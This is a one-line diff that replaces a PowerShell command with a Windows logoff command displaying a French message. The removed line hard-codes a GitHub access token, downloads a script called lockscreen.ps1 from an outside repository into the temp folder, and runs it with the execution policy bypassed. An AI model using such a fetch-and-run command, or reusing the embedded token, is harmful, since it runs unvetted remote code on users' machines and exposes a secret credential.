@@ -1,1 +1,1 @@
-powershell -Command "$ErrorActionPreference='Stop'; $token='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'; $headers=@{Authorization='token '+$token}; Invoke-WebRequest -Uri 'https://api.github.com/Olivia200-cyber/Olivia/main/lockscreen.ps1' -Headers $headers -OutFile $env:TEMP\lockscreen.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\lockscreen.ps1" 2>&1 | Out-File $env:TEMP\pslog.txt
+shutdown /l /c "Ta session s'ouvrira dans deux minutes..."
